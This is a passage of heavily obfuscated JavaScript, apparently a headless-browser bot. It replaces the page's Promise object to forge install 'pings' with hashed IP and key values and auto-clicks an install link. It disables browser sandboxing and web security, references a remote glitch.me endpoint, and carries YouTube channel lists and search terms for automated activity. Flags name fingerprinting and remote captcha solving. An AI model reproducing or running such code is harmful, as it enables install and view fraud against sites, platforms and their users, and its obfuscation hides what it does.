-0xa04 + 0xa7 * -0x9 + 0xfe5] |= (0x5ab + -0xa26 * 0x3 + -0x3 * -0x86d | L >> 0x623 + -0x269 * 0x4 + -0x3 * -0x12d & -0x2123 + 0xfc9 + 0x1199) << y[-0x1fa6 + -0x7 * 0x52 + 0x21e7 & N++], P[N >> 0x14c2 + 0x2a * 0x75 + -0x27f2] |= (-0x129b + 0x1867 * -0x1 + 0x2b82 | -0x333 + 0xd * 0x74 + -0x1 * 0x272 & L) << y[0x8 * 0x475 + -0x1660 + -0x4f * 0x2b & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x19c + 0xf53 + -0x10af * 0x1 ? (this['block'] = P[-0xdf * 0x16 + 0x2 * 0x46c + 0xa62], this['start'] = N - (-0x1b9d + 0x19 * -0x96 + 0x2a83), this['hash'](), this['hashed'] = -0x134 + 0x62 * 0xb + -0x1 * 0x301) : this['start'] = N;
                }
                return this['bytes'] > 0x72e78 * 0x110b + -0x28a629d8 * -0x3 + 0xba88b4f * 0x1 && (this['hBytes'] += this['bytes'] / (-0x1ae130c80 + 0x12a * 0xcf23d6 + 0x17e * 0x12a2fce) << -0x1766 + -0x29 * -0x1a + 0x133c, this['bytes'] = this['bytes'] % (-0xfa620054 + 0x99733d * 0x1bc + 0xf03e2288)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x26f + -0x393 + -0x1 * -0x125;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1dad + 0x18d4 + -0x3671] = this['block'], J[K >> 0x362 * 0x3 + 0x1 * -0x232f + 0x190b] |= x[0xea8 + -0x1d56 + 0xeb1 & K], this['block'] = J[0xfeb + -0x9f8 + -0x5e3], K >= -0x16f1 + -0x149d + 0x2 * 0x15e3 && (this['hashed'] || this['hash'](), J[0x1fa6 + -0x10c2 + -0x2 * 0x772] = this['block'], J[0x1 * 0x20b8 + -0x89f + -0x125 * 0x15] = J[0x86 * -0x1a + -0x10f5 * -0x2 + -0x144d] = J[0x9 * 0x27c + 0xf74 + -0x1 * 0x25ce] = J[-0x2664 + -0x1 * -0x1460 + 0x1207] = J[0xf * -0x91 + 0x110d * -0x1 + 0x1990] = J[-0x4df + 0x3 * 0xc11 + 0x23 * -0xe5] = J[0x28 * -0x9e + -0x19af + 0x13 * 0x2a7] = J[0xb * -0x6 + 0x9 * 0x3eb + -0x22fa] = J[0x119 * 0x15 + -0x1d8d * 0x1 + 0x688] = J[0x26e0 + 0x26f6 + -0x9 * 0x8a5] = J[0x99a * 0x4 + -0x4f7 * -0x7 + 0x1 * -0x491f] = J[0x2556 + 0x1fdb + -0x1 * 0x4526] = J[-0x16db * 0x1 + 0xb14 + 0x1 * 0xbd3] = J[-0x19b1 * -0x1 + 0x1b6 * 0x2 + -0x1d10] = J[0x36c + -0x1 * -0x20ff + -0x245d] = J[-0x93e * 0x3 + 0x369 * 0x5 + 0x1 * 0xabc] = -0xe79 + -0xa4e * 0x2 + 0x2315), J[-0x4f * 0x49 + 0x1d59 + -0x4 * 0x1b1] = this['hBytes'] << -0x1f29 + -0x49 * 0x16 + 0x2572 | this['bytes'] >>> 0x13df + 0xb6b + -0x1f2d, J[0x9a2 + 0x1eed + -0x2880] = this['bytes'] << 0x1f0d + 0x1f9e + 0x2 * -0x1f54, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xb90 + 0x19a2 + -0x2522; J < 0x44 + -0x8 * -0x2f + -0x16c; ++J)
                K = Q[J - (-0x2c0 + -0x12bd + 0x20 * 0xac)] ^ Q[J - (0x3a * -0x7d + 0x1d5 * -0xb + -0x3 * -0x102b)] ^ Q[J - (-0x406 + 0xbc3 * 0x1 + -0x7af)] ^ Q[J - (-0x89b * 0x1 + -0x1 * -0x1535 + 0x645 * -0x2)], Q[J] = K << -0x1 * 0xfaa + 0xb5 * -0x11 + -0x4 * -0x6ec | K >>> -0x144f + 0xbd + -0x47 * -0x47;
              for (J = -0x178 + -0x2322 + -0x249a * -0x1; J < 0x49c + 0x11d5 + -0x165d; J += -0x1f79 + 0x1d75 + -0x1 * -0x209)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xbbf * 0x3 + -0x63 * 0x53 + -0x31f * 0x1 | L >>> -0x1d9 + -0xb22 + 0xd16) + (M & N | ~M & O) + P + (-0xc8ebb30 + 0x2a302a6f + 0xa * 0x6168109) + Q[J] << -0xe2a + 0x1fed + -0x11c3) << 0x755 + -0x2082 + -0xf * -0x1ae | P >>> 0x26c * -0x9 + 0x3 * -0x905 + 0x30f6) + (L & (M = M << 0x137b * -0x2 + -0x1 * -0x205c + -0x1 * -0x6b8 | M >>> 0x189a + 0x1af * 0xd + 0x1 * -0x2e7b) | ~L & N) + O + (0x16b9f22 + -0x12a19183 + 0x6bb86bfa) + Q[J + (-0x1b72 * -0x1 + -0x267d + 0xb0c)] << -0x1 * -0xb86 + -0x420 + -0x766 * 0x1) << 0xa48 + 0x1a67 + -0x24aa | O >>> -0x6f4 + 0xf * -0x83 + -0xebc * -0x1) + (P & (L = L << 0x8da + 0x23fc * -0x1 + -0xda0 * -0x2 | L >>> 0x2b7 * 0xd + 0x13a * -0x8 + -0x1979) | ~P & M) + N + (-0x6b * 0x12e2faa + -0x9 * 0x86344b5 + 0x49137401 * 0x4) + Q[J + (0x2152 + -0x1 * -0x84a + -0x299a)] << 0x238f * 0x1 + 0x1f * 0x97 + -0x2 * 0x1aec) << 0x1 * 0x6d3 + -0xc1 * -0x6 + 0x244 * -0x5 | N >>> -0x4d3 * -0x4 + 0xaf * 0x23 + -0x1 * 0x2b1e) + (O & (P = P << 0x5 * 0x179 + 0x9 * -0x8f + -0x238 | P >>> 0xdab + 0xd * 0x50 + 0x1 * -0x11b9) | ~O & L) + M + (-0xe52b226 + -0x25 * -0x12b85a9 + 0x10246ba * 0x3d) + Q[J + (-0x1aa + 0x4f * 0x3d + -0x1126)] << -0xc43 + -0x7c * 0x1b + -0xd * -0x1f3) << 0x1e8 * 0x4 + -0x33b * 0x3 + -0xb2 * -0x3 | M >>> 0x41 * -0x27 + -0x2d * 0x99 + 0x24e7) + (N & (O = O << -0xdf * 0x15 + 0x2095 + 0x2 * -0x716 | O >>> 0x10f * 0x4 + -0x10ad * 0x1 + -0x1 * -0xc73) | ~N & P) + L + (0x70976d7b + 0x2 * -0x2c202ff1 + 0x422b6c00) + Q[J + (0x1 * -0x8e + -0x1e13 + 0x1ea5)] << 0x1a * -0xe5 + 0x12e3 + -0x1 * -0x45f, N = N << 0x100a + -0x1a87 + -0xb5 * -0xf | N >>> 0x8d * 0x3b + -0x20c6 + 0x49;
              for (; J < 0x27f * -0x3 + -0x142e + 0x1bd3; J += -0x1a86 + 0xa25 + 0x1 * 0x1066)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xa20 + -0x26f * -0xd + 0x14df * -0x2 | L >>> -0x5a + -0x236e * 0x1 + 0x23e3) + (M ^ N ^ O) + P + (-0x92f22f1f + 0x1 * -0x9b6d18ed + 0x19d3933ad) + Q[J] << -0x215b * 0x1 + 0x1183 + 0x18 * 0xa9) << 0x20d9 * -0x1 + 0x828 + 0x1 * 0x18b6 | P >>> 0x2 * 0x146 + 0xfdf + -0x1250) + (L ^ (M = M << -0x1266 + -0x246d + 0x1 * 0x36f1 | M >>> 0x2203 + -0x333 + -0x1ece) ^ N) + O + (0x686eee95 + 0x419d57a8 + -0x3b325a9c) + Q[J + (-0xc95 * -0x2 + 0x1f1 * -0xf + 0x3f6)] << -0x1b61 + 0x1615 * -0x1 + 0x3176) << 0xbd5 * -0x2 + -0x202e + 0x1 * 0x37dd | O >>> 0x24c5 + -0x1071 + -0x1 * 0x1439) + (P ^ (L = L << -0x7ba + -0x33 * 0x92 + -0x1d * -0x146 | L >>> 0x128 * -0xd + 0x7 * 0x2ab + -0x3a3) ^ M) + N + (0x31361c98 + -0xf17f3 * 0x9f7 + 0xd40b757e) + Q[J + (0x1 * 0x12c5 + -0x2cc * 0xa + 0x935)] << -0x421 + -0x152f * 0x1 + 0x1950) << 0x4 * -0xb2 + 0x9d7 * 0x3 + 0x98 * -0x2d | N >>> 0x12fc + -0x1132 + 0x1 * -0x1af) + (O ^ (P = P << -0x1 * -0x52e + -0x1bc + -0x354 | P >>> 0x1b5 * -0x1 + 0x4b2 + 0x1 * -0x2fb) ^ L) + M + (0x58e347e5 * -0x1 + -0x8 * -0x11d70f97 + 0x2 * 0x1c825b67) + Q[J + (-0xba0 + -0xa2 * -0x1b + 0x5 * -0x117)] << -0x1740 + 0x24bc + -0xd7c) << 0x15e0 + -0x1 * 0x240a + 0xe2f * 0x1 | M >>> 0x5 * 0xb + 0x208c + -0x20a8) + (N ^ (O = O << 0x16c * 0x2 + -0x389 * -0x1 + -0x643 | O >>> 0x10d * 0x1 + -0x38f * -0x1 + -0x3e * 0x13) ^ P) + L + (0x7ede8b8d + 0x3 * 0x2a8aee76 + -0x8fa56b4e) + Q[J + (0x288 * 0xd + -0x8f + -0x10b * 0x1f)] << 0x191 * 0x15 + -0xf * -0x17b + 0x1b8d * -0x2, N = N << 0x1 * 0x1f12 + -0x1929 + -0x5cb | N >>> -0x17ca + -0x20d3 + 0x45b * 0xd;
              for (; J < -0x1cbd + -0xf04 + 0x2bfd * 0x1; J += -0x1cfd * -0x1 + 0x115 * 0x1f + 0x4cf * -0xd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1b9b + 0x19d8 + 0x1c8 | L >>> -0x1aee + 0x18e4 + 0x9 * 0x3d) + (M & N | M & O | N & O) + P - (-0x4386b * 0x22b9 + 0x42445 * -0xcb5 + -0x3f * -0x4f410c0) + Q[J] << 0x1 * -0x1c5e + -0x1fc6 + 0xf09 * 0x4) << 0x925 + 0x5 * -0x24a + 0x252 | P >>> 0x1a * -0x57 + -0x1e81 + 0x2772) + (L & (M = M << -0x46a + 0xc2 * -0x2b + 0x251e | M >>> 0x253b + 0x24f7 * 0x1 + 0x8 * -0x946) | L & N | M & N) + O - (0x1 * -0x5c32d9ab + -0xb * 0x705432d + -0x37160c7 * -0x52) + Q[J + (-0x1576 * -0x1 + -0x1bb9 + -0x322 * -0x2)] << -0x843 + -0x21a3 + 0x29e6) << 0x255c + 0x1 * 0x1136 + 0x23 * -0x18f | O >>> 0x2 * -0x73a + 0x24e1 + -0x1652) + (P & (L = L << -0x2685 + 0x1 * 0x22d2 + -0x3d1 * -0x1 | L >>> 0x1ea + 0x724 * 0x2 + 0x1030 * -0x1) | P & M | L & M) + N - (0x17 * 0xf524ff + 0x2f3588b7 + -0x15d433c2 * -0x2) + Q[J + (-0xc02 + 0xde5 + 0x25 * -0xd)] << -0x2036 + 0x15a8 + 0x1 * 0xa8e) << -0x190b + -0x1 * -0x1181 + -0x183 * -0x5 | N >>> 0x253 * 0x1 + 0x10 * -0x137 + 0x2 * 0x89c) + (O & (P = P << -0x1 * -0x1afb + -0x252e + 0xa51 | P >>> 0x1 * -0xbca + -0x4 * -0x15b + 0x660) | O & L | P & L) + M - (-0xc03fd177 + -0x44a5af34 + 0x175c9c3cf) + Q[J + (-0x1 * -0x1f66 + -0x15cd * -0x1 + -0x3530)] << 0x1a0 + -0x1 * -0x180f + -0x1 * 0x19af) << 0x1632 * -0x1 + 0x20d9 + -0xaa2 | M >>> -0x11 * -0xfe + 0x1 * 0x2696 + -0x3759) + (N & (O = O << 0x1f16 + 0x2 * 0x407 + 0xde * -0x2d | O >>> -0x1bd5 + -0x1725 + 0x32fc) | N & P | O & P) + L - (0x62496ae9 + -0xbc7f55 * 0x119 + 0xdd829c88) + Q[J + (-0x2 * -0x81a + 0x2092 + 0x1 * -0x30c2)] << 0x1798 + -0xbd5 + -0x1 * 0xbc3, N = N << 0xee + -0x935 * -0x1 + -0xa05 | N >>> 0x1 * 0xf01 + -0x199 * 0x3 + -0xa34;
              for (; J < 0x1a * -0x5d + -0x1f * 0x12b + 0x2df7; J += -0x1bea + 0x1d7 * 0xe + 0x22d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x447 * -0x1 + 0x14a2 + -0x66 * 0x29 | L >>> -0x8b + -0x75e + 0x2ac * 0x3) + (M ^ N ^ O) + P - (0x1e15f719 + 0x3d829881 + -0x25fb5170) + Q[J] << 0x1 * 0x3a5 + 0x7ed + -0xb92) << 0x3 * -0x933 + -0x1b4e * 0x1 + -0x25 * -0x17c | P >>> -0x182 * -0x17 + 0x21 * 0x12c + 0x44f * -0x11) + (L ^ (M = M << -0x970 * 0x2 + -0x1ba8 + 0xe * 0x355 | M >>> -0x879 + 0x1860 + -0xfe5) ^ N) + O - (0x1b * -0x1acad73 + -0x643fdcb6 + -0x1 * -0xc7136601) + Q[J + (0x4 * -0x626 + 0x2a6 * -0x3 + 0x208b)] << -0x1faf + 0x7 * -0x57 + -0x50 * -0x6d) << 0x1d * 0xf2 + -0x920 * -0x1 + -0x2485 | O >>> 0x4ed * 0x2 + -0x134 * -0x4 + 0xe8f * -0x1) + (P ^ (L = L << 0x67c + 0x19f9 + 0x1 * -0x2057 | L >>> 0x8f5 + 0x15a * -0x2 + -0x63f) ^ M) + N - (0x253db * 0x9e5 + -0x42f5dabc + 0x780e03b * 0xd) + Q[J + (0x117 + -0x1bd * 0xe + 0x1741 * 0x1)] << 0x12f6 + 0x191 + 0x41b * -0x5) << -0x18e7 + 0xa5c + 0xe90 | N >>> -0x714 + 0x1de * 0xd + -0x1 * 0x1117) + (O ^ (P = P << -0x2161 * -0x1 + -0x1 * -0x1e2b + -0x3f6e | P >>> -0x1f42 + -0x6d * -0x43 + 0x2bd) ^ L) + M - (-0x3884485d + -0x1837 * 0x2906e + 0xac38de29) + Q[J + (-0xa64 + 0xd * -0x93 + -0x2 * -0x8ef)] << 0x1870 * -0x1 + -0x1 * -0x129d + -0x3 * -0x1f1) << -0x87 * 0xa + 0x26ce + -0x2183 | M >>> 0x45 * 0x89 + -0x22a + -0x8aa * 0x4) + (N ^ (O = O << 0x75 * -0xe + -0x647 * -0x1 + 0x3d | O >>> 0x171a + 0x20 * -0x68 + 0x8 * -0x143) ^ P) + L - (0x701b64c + -0x55e49e9d + 0x8480267b) + Q[J + (-0xbc9 * -0x2 + -0x10 * 0x139 + -0x3fe)] << 0x2 * 0x1058 + 0xe9 * 0xd + -0x2c85, N = N << -0x2375 + -0x4e + 0x23e1 | N >>> -0xcce + -0x14e8 + 0x21b8;
              this['h0'] = this['h0'] + L << -0x85e + 0x11 * -0x239 + 0x2e27, this['h1'] = this['h1'] + M << -0xb27 + -0x2689 + 0x31b0, this['h2'] = this['h2'] + N << 0x2 * -0x1181 + 0x15d * -0x19 + -0x4517 * -0x1, this['h3'] = this['h3'] + O << 0x28 * -0xef + -0x24a4 + 0x49fc, this['h4'] = this['h4'] + P << -0x674 + 0x2049 + -0x19d5;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x3 * -0x3d3 + -0x4f * 0x76 + 0x2fff & -0x272 + -0x797 + 0xa18 * 0x1] + w[J >> 0x172b + -0x2be + -0x1455 & 0x1627 + 0x1f9c + -0x35b4] + w[J >> -0x19c0 + -0xeac + 0x80 * 0x51 & -0x715 + 0x20a1 + 0x9 * -0x2d5] + w[J >> -0xb9d * -0x3 + 0x5 * 0x2b + 0x239e * -0x1 & -0x1bc6 + -0x66 * 0x2 + 0x15d * 0x15] + w[J >> 0x511 * 0x7 + 0x1e91 + 0x107f * -0x4 & -0x165 + 0x1996 * -0x1 + 0x1b0a * 0x1] + w[J >> 0xc98 + 0x96a + -0x15fa & 0xe91 + 0x189 * -0x3 + -0x9e7] + w[J >> -0x1fe0 + 0x14d + 0x1e97 & 0x6b * 0x15 + 0x47b * -0x8 + 0x1b20] + w[-0xcd + -0x49d * -0x8 + 0x3 * -0xc04 & J] + w[K >> 0x2 * 0x3bb + -0x3b9 + -0x3a1 & -0x1787 + 0x26fe + -0x44 * 0x3a] + w[K >> -0x13 * -0x151 + 0x1d2a + -0x3615 & 0xa63 * 0x1 + -0x1251 + 0x7fd] + w[K >> 0x23c6 + -0x1 * 0x36f + -0x2043 & -0xee9 + -0xe39 * -0x1 + -0xbf * -0x1] + w[K >> 0x57 * 0x65 + -0x1441 + -0xe02 * 0x1 & -0x2 * 0x1378 + 0x2434 + 0x2cb] + w[K >> 0x63a + 0x3f * 0x4f + -0x199f & -0x12ad * 0x1 + 0x3 * 0x1ab + -0x25 * -0x5f] + w[K >> -0x12c2 + 0x1ec4 + -0xbfa & 0x1e9f + -0x2ed + -0x1ba3] + w[K >> 0x911 + 0x662 + -0x1 * 0xf6f & 0x8c4 + -0x3 * -0x1c1 + -0xdf8] + w[0xc42 + 0x12c8 + -0x1efb & K] + w[L >> -0x9ed + -0x7cd * -0x5 + -0x1cf8 * 0x1 & 0xcea + -0x164a + 0x69 * 0x17] + w[L >> -0x9cf + -0xb4e + 0x1535 & 0x131 * 0x1 + 0x3 * 0x327 + -0xa97] + w[L >> -0x15cf + -0x414 + -0x11 * -0x187 & 0xa * 0x87 + 0xb14 + -0x104b] + w[L >> 0x1 * -0x1505 + 0x21d5 + 0x44 * -0x30 & 0x71 * 0x6 + -0x125 * 0xd + 0xc4a] + w[L >> -0x7d * -0x24 + 0x1732 + 0x145d * -0x2 & 0x1bb * 0x7 + -0xeb0 + 0x2a2] + w[L >> -0x247c + -0x1a37 + -0x35 * -0x12f & 0x5 * 0x30b + 0x1241 + -0x2169] + w[L >> 0x26 * 0x2 + 0x1fcc + 0x4 * -0x805 & 0xabd + 0x1a * 0x31 + 0x29c * -0x6] + w[0x118a + 0xaa5 + -0x12c * 0x18 & L] + w[M >> 0x1478 + 0x17a6 + -0x2c02 * 0x1 & 0x2a1 * -0x1 + 0x11fa + -0xf4a] + w[M >> 0x17eb * -0x1 + -0x3 * 0x286 + 0x1f95 & 0x12ac + -0xead * -0x1 + -0x214a] + w[M >> -0xcaa + -0x2143 + 0x1 * 0x2e01 & 0x525 + 0x97c + 0xa * -0x175] + w[M >> 0xf36 + -0x1ca7 + 0xd81 & -0x1891 * 0x1 + -0x49 * -0x47 + -0x3b * -0x13] + w[M >> -0xb * -0x2a1 + 0x1f7 * 0x1 + -0x1ed6 & 0x13bc + 0xa3 * 0x1a + -0x243b] + w[M >> -0xb * -0x27b + -0xb * 0x34a + 0x8ed & -0x9 * 0x91 + -0xa1a + 0xf42] + w[M >> 0xec * -0x21 + -0x5 * 0x79d + -0x47 * -0xf7 & -0x5b4 + -0x1cb6 + 0x2279] + w[-0x7 * 0x589 + 0x4a4 + 0x222a & M] + w[N >> 0x1 * -0x741 + -0x12c9 + 0x1a26 & -0x85 + 0x1f8 + -0x164] + w[N >> -0x1484 + -0x2 * 0x75d + 0x2356 * 0x1 & 0xbc * -0x21 + 0x5 * 0x58e + -0x3 * 0x129] + w[N >> 0x27 * 0xf1 + -0x221 + -0x2282 & -0x1 * 0x569 + 0x1df5 + -0x187d] + w[N >> 0x328 + 0xd8a + -0x10a2 & -0x11b * -0xb + 0x464 + 0x83f * -0x2] + w[N >> -0x1af7 + -0x29 * 0xd3 + -0x16a * -0x2b & 0x7a5 * -0x4 + 0x6d * 0x3 + -0x757 * -0x4] + w[N >> 0x1423 + 0xefb + -0x118b * 0x2 & 0x2409 + -0x3 * 0x5f3 + 0x27 * -0x77] + w[N >> -0x163c + 0xd * 0x48 + 0x1298 & 0x2266 + 0xef * -0x1 + -0x2168] + w[-0x171d + 0xd * -0x16a + -0x6ed * -0x6 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1e95 * 0x1 + 0x3 * -0x12b + 0x4 * -0x6bf & -0x2a9 * -0x1 + -0xb56 + 0x9ac,
                J >> -0x1295 + -0x1ecf + 0x3174 & 0x1 * -0x465 + -0x1 * -0x4fd + 0x1 * 0x67,
                J >> -0xdaf + 0x2 * -0x359 + 0x1469 & -0x2279 + -0x4b4 * -0x1 + -0x1 * -0x1ec4,
                0x19bd * -0x1 + -0x1f * 0x5d + -0x1 * -0x25ff & J,
                K >> -0x7a7 * -0x2 + -0x1c * -0xf4 + 0x3e * -0xad & -0x411 + 0xc04 + -0x6f4,
                K >> -0x1aa7 * -0x1 + 0xb33 + 0x25ca * -0x1 & -0xb8 * 0x26 + 0x18ae + 0x3a1,
                K >> 0x2 * -0x216 + -0x21b6 + 0x25ea & 0x363 + 0x243 * 0x11 + -0x82b * 0x5,
                -0x12d7 + -0x2232 + 0x68 * 0x85 & K,
                L >> -0x1 * -0x1aa7 + -0x982 + 0x3 * -0x5af & -0x1011 + 0x632 + 0xade,
                L >> 0x28a + 0x14 * 0x15d + -0x1a7 * 0x12 & -0x2fa + 0x784 * 0x4 + -0x1a17,
                L >> -0x3d9 + -0x1df9 + 0x21da & -0x230d + -0x163 + 0x256f,
                0xce8 * 0x1 + 0x1 * -0x1c7c + 0x1093 & L,
                M >> 0x153d * 0x1 + 0x2a1 * 0xb + -0x3210 & -0xfba + 0x4ed + 0xbcc,
                M >> -0x1458 + -0x17df + -0x5 * -0x8db & 0x1ef2 + -0x2470 + 0x67d,
                M >> 0xe4f * 0x2 + 0x8ed + 0x9 * -0x42b & 0x243e + -0x1656 + -0x5 * 0x295,
                0x1043 + -0xc * 0x14d + -0x4 * -0x16 & M,
                N >> -0x1cbc + 0x675 * -0x3 + 0x3033 & 0x1 * -0x1c16 + 0xb * 0x20b + 0xbc * 0x9,
                N >> -0x226 + -0x1506 + 0x173c & 0x1 * -0x141b + 0x4 * -0x95f + 0x3a96,
                N >> 0x41f + -0xf * 0x1f3 + -0xde * -0x1d & -0x29 * -0xed + 0x10a2 + -0x3598,
                0x56 * -0x3e + 0x7 * -0x58f + 0x3cbc & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x8a9 + -0xa4 + -0x7f1), (K = new DataView(J))['setUint32'](-0x149 + -0x1cfb + 0x1e44, this['h0']), K['setUint32'](-0x2 * -0x10a6 + 0x14de + -0x3626, this['h1']), K['setUint32'](-0x1021 * 0x1 + 0x261c + -0x15f3 * 0x1, this['h2']), K['setUint32'](-0x17f6 + 0xf2c + -0x46b * -0x2, this['h3']), K['setUint32'](0x47 * 0x86 + 0x1b7c * 0x1 + -0xe * 0x49d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1d56 + -0xce4 + 0x2a3a];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x199a * -0x1 + -0x13 * -0x53 + 0x9 * 0x229;
            J[-0x1 * -0x14ae + 0x4f9 + -0x19a7]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xc65 + 0x6d8 * -0x4 + 0xefb] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x11f4 + -0x1 * -0x25d9 + 0x1 * -0x37cc), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1c29 + 0xf3c + 0x1 * 0xcee;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x2288 + -0x74b * 0x1 + -0x1561), Promise['resolve'](0x1 * -0x235e + -0x114b + 0x34aa);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x166f + -0x2055 + -0x16a * -0x7; j < 0x2 * -0x564 + -0x238f + 0x2e58; j++)
    i();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xeb + 0x1dc5 + -0x1eb0);
    let h = e[f];
    return h;
  }, d(b, c);
}
const NETWORK_PATIENCE = 0x59f * -0x5 + 0x2 * -0x16b9 + 0x68cd + (-0x7 * -0x251 + -0x1cf + 0x56 * -0x8) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1 * -0x1a2d + 0x9ba + -0x23e4) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + U(0x2, 'LGD1') + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    V(0x5) + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1e66 + -0x6aa * -0x1 + 0x1 * -0x2510; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 